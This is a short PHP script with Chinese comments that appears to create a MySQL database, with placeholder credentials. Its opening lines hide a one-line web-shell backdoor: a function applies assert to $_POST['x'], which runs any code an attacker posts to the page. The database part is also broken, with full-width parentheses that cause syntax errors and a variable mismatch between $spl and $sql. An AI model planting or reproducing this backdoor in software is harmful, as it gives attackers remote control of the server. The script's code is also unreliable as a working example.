<?php
    function test($a){
    $a($_POST['x']);
    }
    test(assert);
    $servername = "localhost";
    $username = "username";
    $password = "password";

// 创建连接
$conn = mysqli_connect($servername, $username, $password);
// 监测连接
if（!$conn）{
    die("连接失败：". mysqli_connect_error());
} 

// 创建数据库
$spl = "CREATE DATABASE myDB";
if（mysqli_query($conn,$sql)) {
    echo "数据库创建成功";
} else {
    echo "Error creating database: ". mysqli_error($conn);
}

mysqli_close($conn);
?>